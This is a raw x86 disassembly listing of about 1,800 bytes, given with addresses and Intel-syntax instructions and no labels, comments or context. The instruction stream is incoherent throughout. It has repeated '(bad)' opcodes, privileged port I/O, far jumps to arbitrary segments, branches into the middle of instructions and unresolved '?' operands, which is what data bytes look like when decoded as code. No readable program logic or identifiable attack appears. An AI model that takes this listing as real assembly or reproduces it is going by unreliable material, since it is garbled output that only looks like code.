  420d24:	pop    ss
  420d25:	and    ah,BYTE PTR [esp+ecx*2]
  420d28:	popa   
  420d29:	add    DWORD PTR [esp+esi*2+0x3541cdbd],ecx
  420d30:	adc    esi,esi
  420d32:	pushf  
  420d33:	and    DWORD PTR [esi],edi
  420d35:	(bad)  
  420d36:	and    eax,0xfbeeafe4
  420d3b:	push   cs
  420d3c:	inc    esi
  420d3d:	or     eax,0x90c18e73
  420d42:	repz jmp 0x420d7b
  420d45:	inc    edi
  420d46:	mov    eax,ds:0x40bae6cd
  420d4b:	mov    dh,0x6e
  420d4d:	inc    eax
  420d4e:	or     ebx,DWORD PTR [edx]
  420d50:	adc    esp,DWORD PTR [edx-0x32f2dcbf]
  420d56:	fimul  DWORD PTR [ebx]
  420d58:	int3   
  420d59:	jmp    0x420d18
  420d5b:	aad    0xeb
  420d5d:	lock xor DWORD PTR [esi+edi*4-0x9142199],0x77
  420d66:	and    DWORD PTR [eax-0xc20e698],ebp
  420d6c:	mov    cl,0xe1
  420d6e:	xchg   esp,eax
  420d6f:	inc    ebx
  420d70:	mov    ds,WORD PTR [edx]
  420d72:	dec    eax
  420d73:	mov    eax,0x8dd12b53
  420d78:	adc    DWORD PTR [esi+0x615ed048],esp
  420d7e:	push   0x47f6b1bb
  420d83:	push   0x24e5e144
  420d88:	sbb    DWORD PTR [ebp+0x3b9641fa],ebx
  420d8e:	mov    ah,0x5a
  420d90:	vcvtsd2ss xmm2,xmm7,QWORD PTR [esi]
  420d94:	retf   
  420d95:	pop    edi
  420d96:	jno    0x420dd4
  420d98:	cmc    
  420d99:	and    eax,0x420ffcfa
  420d9e:	inc    bl
  420da0:	xor    bl,BYTE PTR [esi+ebx*8-0x10]
  420da4:	retf   
  420da5:	aaa    
  420da6:	ret    0x1460
  420da9:	adc    DWORD PTR [esp+edx*1],edi
  420dac:	sbb    DWORD PTR [ecx],esi
  420dae:	cmp    DWORD PTR [ebp-0x66207a48],eax
  420db4:	mov    BYTE PTR [ebx],bl
  420db6:	jmp    0x420d84
  420db8:	dec    eax
  420db9:	rol    DWORD PTR [eax+0x2b],0x28
  420dbd:	dec    ebp
  420dbe:	jmp    0x420e23
  420dc0:	mov    eax,DWORD PTR [ebx-0x7ef3cf19]
  420dc6:	cmp    al,0xc6
  420dc8:	cwde   
  420dc9:	cmp    ebp,esp
  420dcb:	aad    0x45
  420dcd:	(bad)  
  420dce:	mov    al,ds:0xa4711934
  420dd3:	xchg   DWORD PTR [ebp+0x17],esi
  420dd6:	popf   
  420dd7:	jbe    0x420e2e
  420dd9:	stc    
  420dda:	inc    edx
  420ddb:	push   ss
  420ddc:	cmp    DWORD PTR [ebp+0x70652931],eax
  420de2:	and    DWORD PTR [eax],eax
  420de4:	ficomp DWORD PTR [ebp+eiz*8+0x1cfcbbdc]
  420deb:	cld    
  420dec:	out    0x2e,eax
  420dee:	add    ch,BYTE PTR [edx-0x6a]
  420df1:	aaa    
  420df2:	daa    
  420df3:	adc    ebp,0xfffffff2
  420df6:	pop    edx
  420df7:	ins    DWORD PTR es:[edi],dx
  420df8:	jmp    0x6ca37bd9
  420dfd:	or     DWORD PTR [esi+edx*2],esp
  420e00:	cld    
  420e01:	mov    esi,0xe6e345f7
  420e06:	mov    edx,0x95132d8f
  420e0b:	imul   edx,DWORD PTR [ebx+0x1d],0x9e59e19
  420e12:	out    dx,al
  420e13:	ret    
  420e14:	add    edi,DWORD PTR [esi+0x2f]
  420e17:	into   
  420e18:	mov    ds:0xfec951b6,al
  420e1d:	cmp    DWORD PTR [edx],0xfffffffd
  420e20:	neg    BYTE PTR [edx+edx*1]
  420e23:	inc    eax
  420e24:	cmc    
  420e25:	dec    ebp
  420e26:	mov    ah,ah
  420e28:	daa    
  420e29:	xor    al,dl
  420e2b:	mov    al,ds:0x5050bae5
  420e30:	scas   eax,DWORD PTR es:[edi]
  420e31:	sbb    BYTE PTR [esi+0x45678175],ah
  420e37:	int3   
  420e38:	inc    esp
  420e39:	popa   
  420e3a:	lahf   
  420e3b:	add    DWORD PTR [edx-0xd3686dd],0x2616392f
  420e45:	out    dx,eax
  420e46:	inc    edi
  420e47:	mov    ebx,0x3440f9a2
  420e4c:	pop    edi
  420e4d:	iret   
  420e4e:	mov    ds:0x9b31eb7d,eax
  420e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e54:	xor    eax,0x925e026e
  420e59:	in     eax,dx
  420e5a:	stos   BYTE PTR es:[edi],al
  420e5b:	xlat   BYTE PTR ds:[ebx]
  420e5c:	jg     0x420e56
  420e5e:	push   edi
  420e5f:	sbb    esp,DWORD PTR [esi-0x27]
  420e62:	xor    eax,0xaedd40e6
  420e67:	sbb    bh,BYTE PTR [ebx]
  420e69:	frstor [edi-0x6a]
  420e6c:	dec    esi
	...
  420e79:	add    BYTE PTR [eax-0x77],bh
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420eff
  420e87:	or     ebp,DWORD PTR [edx]
  420e89:	das    
  420e8a:	hlt    
  420e8b:	mov    al,BYTE PTR [ecx]
  420e8d:	add    bl,bh
  420e8f:	add    DWORD PTR [eax],eax
  420e91:	add    al,bh
  420e93:	clc    
  420e94:	mov    ecx,0x59c2f347
  420e99:	into   
  420e9a:	cwde   
  420e9b:	sub    al,0x5
  420e9d:	cs jbe 0x420ec5
  420ea0:	sbb    DWORD PTR [edi+0x457a1772],eax
  420ea6:	mov    eax,0x546ce166
  420eab:	fcom   DWORD PTR ds:0x17e8a9bf
  420eb1:	dec    edx
  420eb2:	push   0x74
  420eb4:	dec    esi
  420eb5:	inc    eax
  420eb6:	inc    edx
  420eb7:	fdivr  DWORD PTR [ecx]
  420eb9:	push   ebx
  420eba:	out    0x42,al
  420ebc:	jne    0x420e6b
  420ebe:	jmp    0xdc1f:0xc7dc725b
  420ec5:	xchg   edi,eax
  420ec6:	pop    eax
  420ec7:	hlt    
  420ec8:	inc    esi
  420ec9:	mul    BYTE PTR [ebx+ebp*2+0x63a1ce80]
  420ed0:	les    ebp,FWORD PTR ds:0x2505e13c
  420ed6:	bound  ebp,QWORD PTR [ebx+0xf]
  420ed9:	pop    ebx
  420eda:	and    al,0x89
  420edc:	adc    BYTE PTR [ecx+edx*2-0x7e],cl
  420ee0:	outs   dx,BYTE PTR ds:[esi]
  420ee1:	xchg   edx,eax
  420ee2:	jge    0x420ef7
  420ee4:	sub    eax,0x7f832a55
  420ee9:	imul   ebx,DWORD PTR [ebx+0x628bae94],0x96caa3cd
  420ef3:	je     0x420f74
  420ef5:	pop    es
  420ef6:	mov    eax,ds:0xbc9e1380
  420efb:	arpl   WORD PTR [ecx-0x6f587c53],cx
  420f01:	push   ebx
  420f02:	rol    bh,cl
  420f04:	(bad)  
  420f05:	mov    eax,0xad64819e
  420f0a:	mov    bh,ah
  420f0c:	jb     0x420f12
  420f0e:	pop    esi
  420f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f10:	sbb    al,0xa2
  420f12:	out    0x8d,eax
  420f14:	pop    ebp
  420f15:	fs inc ecx
  420f17:	jbe    0x420f02
  420f19:	jmp    0x420f13
  420f1b:	cmp    ebx,DWORD PTR [ebx]
  420f1d:	in     al,dx
  420f1e:	jl     0x420ede
  420f20:	or     BYTE PTR ds:0x4ded43d2,cl
  420f26:	int3   
  420f27:	inc    edi
  420f28:	mov    dl,BYTE PTR [ebp+0x294d9dd]
  420f2e:	in     al,dx
  420f2f:	mov    ah,0xee
  420f31:	aaa    
  420f32:	outs   dx,DWORD PTR ds:[esi]
  420f33:	outs   dx,DWORD PTR ds:[esi]
  420f34:	pop    ds
  420f35:	outs   dx,DWORD PTR ds:[esi]
  420f36:	push   ebp
  420f37:	les    edx,FWORD PTR [eax+eax*4+0x19e5478e]
  420f3e:	mov    ebp,0x34c73f13
  420f43:	stos   DWORD PTR es:[edi],eax
  420f44:	ins    DWORD PTR es:[edi],dx
  420f45:	adc    DWORD PTR [eax+0x10],ecx
  420f48:	mov    eax,0x5bb3ed67
  420f4d:	arpl   di,si
  420f4f:	dec    ebp
  420f50:	add    al,0x58
  420f52:	aad    0xc
  420f54:	inc    esp
  420f55:	jae    0x420fb4
  420f57:	dec    eax
  420f58:	mov    cl,dl
  420f5a:	std    
  420f5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f5c:	inc    esp
  420f5d:	in     al,dx
  420f5e:	cmp    BYTE PTR [ebx-0x3f97dd0e],ch
  420f64:	add    bh,ch
  420f66:	ss pop edi
  420f68:	daa    
  420f69:	nop
  420f6a:	jmp    0xce466675
  420f6f:	ins    BYTE PTR es:[edi],dx
  420f70:	xor    ch,BYTE PTR [eax-0x4f]
  420f73:	test   BYTE PTR [edx+0xb98ef88],ah
  420f79:	fbstp  TBYTE PTR [esi-0xba17c34]
  420f7f:	test   DWORD PTR [eax+0x21ceda19],edi
  420f85:	xchg   DWORD PTR [eax+ebp*2],ecx
  420f88:	ins    BYTE PTR es:[edi],dx
  420f89:	xchg   ebx,eax
  420f8a:	nop
  420f8b:	fs aaa 
  420f8d:	jbe    0x420fef
  420f8f:	mov    dh,0x1c
  420f91:	xchg   edi,eax
  420f92:	div    BYTE PTR [ecx]
  420f94:	add    DWORD PTR [esi+0x45a71f71],esi
  420f9a:	test   esp,edx
  420f9c:	mov    eax,ds:0xa6ddb175
  420fa1:	mov    bh,0xd
  420fa3:	into   
  420fa4:	dec    esi
  420fa5:	loopne 0x420fb8
  420fa7:	mov    gs,WORD PTR [esi-0x2f03ca47]
  420fad:	mov    ecx,0xef6e186a
  420fb2:	cmc    
  420fb3:	stc    
  420fb4:	es dec ebp
  420fb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fb7:	xchg   esi,eax
  420fb8:	lahf   
  420fb9:	les    ebp,FWORD PTR [edx-0x1576a269]
  420fbf:	jp     0x420fc9
  420fc1:	add    al,0xc3
  420fc3:	push   cs
  420fc4:	icebp  
  420fc5:	and    al,0xb6
  420fc7:	sahf   
  420fc8:	mov    DWORD PTR [esi+0x3053023c],esp
  420fce:	mov    esi,0x9483e745
  420fd3:	popa   
  420fd4:	mov    al,0x7c
  420fd6:	(bad)  
  420fd7:	cmp    al,0xe6
  420fd9:	pop    ss
  420fda:	retf   
  420fdb:	call   0x94f55102
  420fe0:	mov    esp,0xe8e0f56c
  420fe5:	daa    
  420fe6:	lods   eax,DWORD PTR ds:[esi]
  420fe7:	and    eax,0xd1bfea2
  420fec:	or     DWORD PTR [ecx-0x6f60234e],0xffffff85
  420ff3:	fisub  DWORD PTR [edi-0x7a62af83]
  420ff9:	nop
  420ffa:	sbb    bh,ch
  420ffc:	mov    dl,0xa1
  420ffe:	and    cl,BYTE PTR [edi-0x495ad2e]
  421004:	loope  0x421072
  421006:	addr16 mov edx,0x4f2e6e2
  42100c:	call   0xbdb1260
  421011:	rol    DWORD PTR [eax+0x7443a210],0xaa
  421018:	xor    bh,BYTE PTR ss:[ecx]
  42101b:	push   0xe36f2ce7
  421020:	xchg   ebx,eax
  421021:	(bad)  
  421022:	pop    ebp
  421023:	sbb    eax,DWORD PTR [ebx+ebx*4-0x2bb7ae0]
  42102a:	jmp    0xe389cdec
  42102f:	fucomip st,st(1)
  421031:	adc    BYTE PTR [eax+0x1595847e],dh
  421037:	adc    DWORD PTR ds:0xbdf65db,edx
  42103d:	mov    eax,ds:0xc0f96d12
  421042:	sbb    dl,BYTE PTR [ebp-0x25]
  421045:	imul   ebp,DWORD PTR [esi+0x4aee6872],0x3df5510d
  42104f:	lods   al,BYTE PTR ds:[esi]
  421050:	inc    ebx
  421051:	inc    esi
  421052:	pop    ss
  421053:	and    eax,0xd54afd62
  421058:	xor    ebp,DWORD PTR [edx-0x1c]
  42105b:	in     al,0xfd
  42105d:	jecxz  0x421016
  42105f:	imul   ebx,DWORD PTR [esi+0x57],0xffffff98
  421063:	lahf   
  421064:	ror    BYTE PTR [edi-0x3],0x9a
  421068:	out    0x9e,al
  42106a:	mov    eax,ds:0x12472847
  42106f:	int    0xb0
  421071:	push   ss
  421072:	pushf  
  421073:	mov    ecx,0xdcc6d44c
  421078:	push   0xfffffff6
  42107a:	ins    BYTE PTR es:[edi],dx
  42107b:	ds jae 0x4210fc
  42107e:	push   ebx
  42107f:	push   es
  421080:	ret    0x6224
  421083:	sub    DWORD PTR [ecx+0x53],edi
  421086:	daa    
  421087:	repnz pop edi
  421089:	lds    ebp,FWORD PTR ds:[esi]
  42108c:	fld    DWORD PTR [eax]
	...
  42109a:	pop    esp
  42109b:	mov    dh,BYTE PTR [edi-0x23800895]
  4210a1:	mov    edi,0x2b60ebfc
  4210a6:	mov    ecx,0xefbca4fd
  4210ab:	mov    WORD PTR [ecx],es
  4210ad:	add    bl,bh
  4210af:	add    DWORD PTR [eax],eax
  4210b1:	add    BYTE PTR [ebx-0x26db2989],dl
  4210b7:	cs xchg ebp,eax
  4210b9:	data16 ss icebp 
  4210bc:	cdq    
  4210bd:	or     BYTE PTR [ecx+0x36],0xc1
  4210c1:	add    DWORD PTR [ecx+0x3a],esp
  4210c4:	sbb    eax,0x76d3b090
  4210c9:	rcr    BYTE PTR [esp+ebp*8+0x3477b5a1],0x5e
  4210d1:	scas   al,BYTE PTR es:[edi]
  4210d2:	fwait
  4210d3:	mov    eax,DWORD PTR [edx+0x30730357]
  4210d9:	mov    al,ds:0x53a7165d
  4210de:	pushf  
  4210df:	stos   BYTE PTR es:[edi],al
  4210e0:	or     BYTE PTR [ebx],0x50
  4210e3:	cmp    al,0xac
  4210e5:	leave  
  4210e6:	pop    eax
  4210e7:	aad    0x38
  4210e9:	imul   eax,DWORD PTR [esi+0x1a],0x3acf35e6
  4210f0:	leave  
  4210f1:	adc    al,0x1
  4210f3:	arpl   WORD PTR [edx],dx
  4210f5:	sub    al,0x22
  4210f7:	scas   al,BYTE PTR es:[edi]
  4210f8:	dec    ecx
  4210f9:	and    BYTE PTR [ebx+ebp*2-0xc],ch
  4210fd:	bound  ecx,QWORD PTR [eax-0x6613466e]
  421103:	jmp    0x421098
  421105:	out    0xc0,al
  421107:	je     0x4210c2
  421109:	xlat   BYTE PTR ds:[ebx]
  42110a:	pusha  
  42110b:	mov    esi,0xb074ccae
  421110:	cwde   
  421111:	jb     0x4210b3
  421113:	clc    
  421114:	loopne 0x421189
  421116:	imul   ebx,edi,0xffffffde
  421119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42111a:	mov    ah,0x52
  42111c:	add    DWORD PTR [ebx+0x4bbe59c9],edi
  421122:	dec    esi
  421123:	adc    ebx,ebp
  421125:	sar    DWORD PTR [edi],cl
  421127:	pop    ecx
  421128:	push   0x89d9e7d5
  42112d:	jecxz  0x421110
  42112f:	mov    edx,0x2d66ac51
  421134:	popa   
  421135:	push   esi
  421136:	or     ah,0xee
  421139:	sbb    dl,dl
  42113b:	fst    QWORD PTR [ecx-0x3a]
  42113e:	adc    DWORD PTR [ecx],0xef6c8bfb
  421144:	fadd   DWORD PTR [ebx+eax*4-0x5f]
  421148:	pop    es
  421149:	(bad)  
  42114b:	push   es
  42114c:	push   0xffffffdb
  42114e:	cmp    ah,BYTE PTR [edx]
  421150:	cmp    eax,0x7ae6a899
  421155:	xlat   BYTE PTR fs:[ebx]
  421157:	ins    DWORD PTR es:[edi],dx
  421158:	(bad)  
  42115a:	adc    al,0x67
  42115c:	mov    ebp,DWORD PTR [esi+0x2c]
  42115f:	dec    ecx
  421160:	sub    eax,0xed3fa812
  421165:	(bad)  
  421166:	mov    al,0xf3
  421168:	xor    bl,BYTE PTR [edx+ebx*8-0x30]
  42116c:	retf   
  42116d:	imul   esi,eax,0x8c312f1b
  421173:	stos   DWORD PTR es:[edi],eax
  421174:	push   cs
  421175:	mov    esp,0x2e7c6a93
  42117a:	push   ebx
  42117b:	cmp    ebx,edi
  42117d:	mov    eax,0xe4fd53e9
  421182:	push   edi
  421183:	aaa    
  421184:	je     0x421142
  421186:	xor    BYTE PTR [edx+0x2a],al
  421189:	sahf   
  42118a:	xchg   ecx,eax
  42118b:	mov    BYTE PTR [esi+ebp*4],bl
  42118e:	hlt    
  42118f:	push   es
  421190:	out    dx,al
  421191:	jmp    0x4211c3
  421193:	test   ch,bl
  421195:	fstp   TBYTE PTR [ebx-0x65564dd1]
  42119b:	outs   dx,BYTE PTR ds:[esi]
  42119c:	cld    
  42119d:	jmp    FWORD PTR [edi+0x1b]
  4211a0:	inc    ecx
  4211a1:	add    eax,0xa895baf3
  4211a6:	or     BYTE PTR [ebx-0x1d],al
  4211a9:	scas   eax,DWORD PTR es:[edi]
  4211aa:	mov    dl,0xe3
  4211ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ad:	ror    DWORD PTR [esi],0xd1
  4211b0:	mov    edi,DWORD PTR ds:0x5ff7cb5a
  4211b6:	pop    edx
  4211b7:	loopne 0x421216
  4211b9:	loopne 0x421158
  4211bb:	mov    ecx,0xa7cc6ec8
  4211c0:	xor    ebp,DWORD PTR [edx-0x40]
  4211c3:	xor    al,BYTE PTR [ebx+0x7e836f75]
  4211c9:	fdiv   QWORD PTR [esi+0x7097dc68]
  4211cf:	inc    ecx
  4211d0:	mov    cl,0xd6
  4211d2:	sti    
  4211d3:	pmulhuw mm1,mm0
  4211d6:	pop    esi
  4211d7:	pop    es
  4211d8:	mov    edi,0x9bf87bfa
  4211dd:	push   edi
  4211de:	cmc    
  4211df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211e1:	icebp  
  4211e2:	and    DWORD PTR [edx+0x50],ecx
  4211e5:	ficom  DWORD PTR [edx+0x11]
  4211e8:	xor    ch,BYTE PTR [ebx]
  4211ea:	ret    
  4211eb:	add    BYTE PTR [esi+ecx*4-0x2b262c16],cl
  4211f2:	fs mov ah,0x3
  4211f5:	aaa    
  4211f6:	adc    BYTE PTR [eax-0x43d793bf],ah
  4211fc:	inc    edi
  4211fd:	retf   
  4211fe:	rol    esi,1
  421200:	xchg   esp,eax
  421201:	adc    al,0x17
  421203:	lds    esi,FWORD PTR [edi-0x38]
  421206:	add    edx,ecx
  421208:	dec    ebx
  421209:	test   DWORD PTR [ebx-0x38],esi
  42120c:	jmp    0xa0627adf
  421211:	jb     0x421266
  421213:	rcl    DWORD PTR [edx-0x6e],0xc7
  421217:	adc    esi,edi
  421219:	loope  0x4211fd
  42121b:	jae    0x4211d5
  42121d:	xchg   ebx,eax
  42121e:	or     eax,0x27488538
  421223:	push   0xdf24ca89
  421228:	xor    edi,ecx
  42122a:	sub    bl,BYTE PTR [esp+ebp*1+0x7f]
  42122e:	sahf   
  42122f:	rcl    ebp,1
  421231:	or     ebx,DWORD PTR [ebx-0x3]
  421234:	sbb    bl,BYTE PTR ds:0x4fa2f754
  42123a:	sbb    BYTE PTR [ebx-0x59],ah
  42123d:	pop    esp
  42123e:	pop    esp
  42123f:	inc    ecx
  421240:	sahf   
  421241:	push   es
  421242:	ret    0x36f6
  421245:	mov    al,0x8c
  421247:	cmp    ah,BYTE PTR [ebx+0x618ed4d6]
  42124d:	in     al,0x4f
  42124f:	out    dx,al
  421250:	xor    al,0x59
  421252:	(bad)  
  421253:	jne    0x42124b
  421255:	mov    esp,0xf8f23251
  42125a:	add    BYTE PTR [ebx+0x39],al
  42125d:	fnstsw WORD PTR [esi]
  42125f:	test   DWORD PTR [ebx+0x61],ecx
  421262:	mov    esi,0x36735b75
  421267:	int    0xe2
  421269:	sub    BYTE PTR ds:0x12cfcf,cl
  42126f:	cmc    
  421270:	dec    ecx
  421271:	and    BYTE PTR [edx+0x67a2dc77],bh
  421277:	int3   
  421278:	pusha  
  421279:	lods   al,BYTE PTR ds:[esi]
  42127a:	test   BYTE PTR [edi+eax*1],ch
  42127d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42127e:	rcl    BYTE PTR [eax+0x220e649c],cl
  421284:	or     eax,0x483150df
  421289:	scas   al,BYTE PTR es:[edi]
  42128a:	sub    BYTE PTR [esi+0x6f],cl
  42128d:	popa   
  42128e:	xchg   ebp,eax
  42128f:	(bad)  
  421290:	out    0xec,eax
  421292:	xor    ch,BYTE PTR [eax+0x20e8828]
  421298:	cmp    WORD PTR [edx+0x1e],si
  42129c:	pop    esi
  42129d:	imul   BYTE PTR [ebp+0x5344e70c]
  4212a3:	jns    0x421313
  4212a5:	adc    esp,DWORD PTR [edi-0x61cfb932]
  4212ab:	cmc    
  4212ac:	and    al,BYTE PTR [eax]
	...
  4212ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212bb:	sbb    al,BYTE PTR [edi-0x204026]
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx-0x37329706]
  4212ca:	jmp    0x1:0xfb00018e
  4212d1:	add    BYTE PTR [ebx+0x561db937],ah
  4212d7:	adc    edx,DWORD PTR [edi]
  4212d9:	jmp    0x42127a
  4212db:	or     DWORD PTR [edx],0x4918d544
  4212e1:	mov    ch,BYTE PTR [bx+si+0x5498]
  4212e6:	jmp    0xf1da5c82
  4212eb:	test   al,0xdc
  4212ed:	int3   
  4212ee:	xor    ah,BYTE PTR [ecx+eiz*4]
  4212f1:	bound  edi,QWORD PTR [eax-0x26]
  4212f4:	shr    BYTE PTR [ebx-0x25],1
  4212f7:	push   ds
  4212f8:	loop   0x421350
  4212fa:	adc    DWORD PTR [ecx-0xc],edx
  4212fd:	popa   
  4212fe:	jp     0x4212cb
  421300:	aaa    
  421301:	cld    
  421302:	add    al,0x86
  421304:	mov    bl,0xa1
  421306:	imul   eax,DWORD PTR gs:[edx+0x222a8ebe],0x2
  42130e:	xor    al,0x8c
  421310:	and    bl,0xae
  421313:	ret    0xd3f2
  421316:	add    ah,BYTE PTR [ecx+0x11fd1da6]
  42131c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42131d:	stos   BYTE PTR es:[edi],al
  42131e:	call   0x7ec3:0xf60978bc
  421325:	fild   WORD PTR [ebx+0x3a160167]
  42132b:	inc    ebx
  42132c:	sub    al,0x79
  42132e:	pushf  
  42132f:	dec    ecx
  421330:	pop    eax
  421331:	xor    cl,al
  421333:	dec    ecx
  421334:	arpl   WORD PTR [eax+edx*1],di
  421337:	out    0xfd,al
  421339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42133a:	cmc    
  42133b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42133c:	in     al,0x11
  42133e:	xchg   ecx,eax
  42133f:	sub    al,0x3a
  421341:	dec    ecx
  421342:	sbb    BYTE PTR [ecx-0x49],0x60
  421346:	push   es
  421347:	push   edi
  421348:	fcomp  DWORD PTR [ecx-0x3]
  42134b:	dec    edi
  42134c:	sbb    al,0xb1
  42134e:	push   ebp
  42134f:	xor    ebx,DWORD PTR [edi+0xd]
  421352:	cmp    al,0x76
  421354:	mov    esi,0x3f21e37a
  421359:	stc    
  42135a:	inc    edi
  42135b:	sub    al,0x2c
  42135d:	pop    ss
  42135e:	mov    edi,0x9531851f
  421363:	(bad)  [eax+0x78ad9873]
  421369:	jo     0x42138f
  42136b:	mov    dh,0x6a
  42136d:	loope  0x4213ad
  42136f:	jb     0x4213d4
  421371:	pop    ebp
  421372:	xor    dl,cl
  421374:	xchg   ebx,eax
  421375:	mov    al,ds:0x27706e42
  42137a:	jnp    0x4213da
  42137c:	shr    DWORD PTR [eax-0x5cd1f65e],0xbd
  421383:	call   0xf8dd234f
  421388:	inc    esi
  421389:	push   ebx
  42138a:	mov    ah,0x92
  42138c:	push   eax
  42138d:	pop    ecx
  42138e:	fwait
  42138f:	adc    eax,0x40e60693
  421394:	ret    0x54e9
  421397:	popa   
  421398:	mov    WORD PTR [ebp-0x32],?
  42139b:	lods   al,BYTE PTR ds:[esi]
  42139c:	std    
  42139d:	leave  
  42139e:	fdivr  st(3),st
  4213a0:	mov    esi,0xca49e9d3
  4213a5:	outs   dx,BYTE PTR ds:[esi]
  4213a6:	mov    bh,0xca
  4213a8:	ja     0x4213f3
  4213aa:	mov    bl,0x22
  4213ac:	ret    0x8df2
  4213af:	adc    DWORD PTR [bx-0x16],esi
  4213b3:	push   edx
  4213b4:	shr    BYTE PTR [ecx-0x2fc977f5],cl
  4213ba:	cmp    edx,DWORD PTR [edx-0x56]
  4213bd:	bound  edx,QWORD PTR [ebp-0x52]
  4213c0:	inc    esi
  4213c1:	gs mov al,bl
  4213c4:	mov    edx,db6
  4213c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213c8:	xchg   ebp,eax
  4213c9:	mov    dh,0x50
  4213cb:	sub    ebx,DWORD PTR [eax-0xa]
  4213ce:	cli    
  4213cf:	mov    ah,0x98
  4213d1:	pushf  
  4213d2:	jbe    0x4213f5
  4213d4:	xchg   esi,eax
  4213d5:	push   edi
  4213d6:	(bad)  
  4213d7:	in     al,0x92
  4213d9:	adc    BYTE PTR [edx-0x2c],bl
  4213dc:	adc    al,0x1e
  4213de:	mov    ah,0xc4
  4213e0:	leave  
  4213e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213e2:	add    eax,0x2534b0cc
  4213e7:	ins    DWORD PTR es:[edi],dx
  4213e8:	sub    al,0x35
  4213ea:	mov    dl,0x86
  4213ec:	xchg   esi,eax
  4213ed:	mov    bl,0x19
  4213ef:	pop    eax
  4213f0:	dec    ebx
  4213f1:	je     0x4213c0
  4213f3:	push   edx
  4213f4:	xchg   edi,eax
  4213f5:	or     eax,0x6f2c29e9
  4213fa:	test   DWORD PTR [eax-0x66da118b],eax
  421400:	inc    esp
  421401:	xor    dh,al
  421403:	imul   edi,DWORD PTR [ecx+0x557ec528],0x33c51790
  42140d:	and    dh,bl
  42140f:	jl     0x42142b
  421411:	mov    bl,0x7d
  421413:	cwde   
  421414:	ds adc eax,0x452a0e05
  42141a:	fwait
  42141b:	je     0x421474
  42141d:	jo     0x4213e1
  42141f:	mov    dl,bh
  421421:	add    al,0xb0
  421423:	push   0x54
  421425:	inc    ebp
  421426:	in     al,dx
  421427:	dec    edi
  421428:	jp     0x42140b
  42142a:	iret   
  42142b:	cmp    eax,0x2bec2563
  421430:	lods   al,BYTE PTR ds:[esi]
  421431:	mov    ds:0x559ccd4,al
  421436:	pop    eax
  421437:	test   eax,0x4466e366
  42143c:	adc    al,0xc1
  42143e:	jb     0x421406
  421440:	adc    bl,dh
  421442:	pop    ss
  421443:	push   cs
  421444:	dec    ebp
  421445:	pusha  
  421446:	mov    ds:0xa98e2725,eax
  42144b:	das    
  42144c:	ins    DWORD PTR es:[edi],dx
  42144d:	fwait
  42144e:	xchg   ebx,eax
  42144f:	sbb    DWORD PTR [ecx],ecx
  421451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421452:	(bad)  
  421453:	add    ah,dl
  421455:	dec    esp
  421456:	cdq    
  421457:	pop    esp
  421458:	xor    cl,BYTE PTR [esi+0x65]
  42145b:	mov    dl,0x2f
  42145d:	jge    0x4214d7
  42145f:	xchg   edi,eax
  421460:	in     al,0x49
  421462:	dec    eax
  421463:	and    DWORD PTR [ecx+0x3b7861bf],edx
  421469:	lds    esp,FWORD PTR [edi+0x58]
  42146c:	pop    eax
  42146d:	and    dl,BYTE PTR [ebx+0x2]
  421470:	pop    ds
  421471:	xor    cl,BYTE PTR ds:0xb1f893de
  421477:	xchg   ecx,eax
  421478:	repnz xor al,0x22
  42147b:	mov    ?,WORD PTR [eax-0x1a]
  42147e:	in     eax,0x22
  421480:	and    bh,BYTE PTR [edx]
  421482:	out    0x66,eax
  421484:	retf   
  421485:	icebp  
  421486:	cmp    eax,0x141613ff
  42148b:	test   DWORD PTR [edi],ebx
  42148d:	int    0x4a
  42148f:	cmp    edi,DWORD PTR [edi]
  421491:	mov    ecx,DWORD PTR [eax-0x3d8c1341]
  421497:	and    BYTE PTR [ebx+edi*8],0x64
  42149b:	jo     0x421430
  42149d:	xor    edx,ebp
  42149f:	add    eax,0xbc6d2539
  4214a4:	inc    eax
  4214a5:	jns    0x42146e
  4214a7:	mov    ebp,0x8477aa25
  4214ac:	test   eax,esi
  4214ae:	cld    
  4214af:	mov    bl,0xdb
  4214b1:	fisttp WORD PTR fs:[esi+ebx*2-0x1f43ce13]
  4214b9:	or     edx,ebx
  4214bb:	pop    eax
  4214bc:	or     BYTE PTR [ebp-0x181790b7],bh
  4214c2:	in     eax,0x4c
  4214c4:	adc    BYTE PTR [edi+0x1798cc28],bl
  4214ca:	clc    
  4214cb:	pop    esp
  4214cc:	mov    ecx,0x0
	...
  4214d9:	add    BYTE PTR [ebp-0x15b01f1],bl
  4214df:	cmc    
  4214e0:	fistp  QWORD PTR [edi]
  4214e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	jp     0x421532
  4214e8:	push   esp
  4214e9:	leave  
  4214ea:	in     eax,0x90
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	sti    
  4214ef:	add    DWORD PTR [eax],eax
  4214f1:	add    BYTE PTR [eax-0x6e2a4e5c],ah
  4214f7:	sub    eax,ebp
  4214f9:	nop
  4214fa:	sub    BYTE PTR [esi],al
  4214fc:	mov    edx,0xabaa4f1c
  421501:	mov    ah,0x30
  421503:	push   0xffffffae
  421505:	cdq    
  421506:	dec    edx
  421507:	in     eax,dx
  421508:	popf   
  421509:	mov    esp,esi
  42150b:	push   0x29
  42150d:	hlt    
  42150e:	push   esi
  42150f:	ret    0x88b9
  421512:	push   ss
  421513:	mov    BYTE PTR [eax-0x51afe345],dh
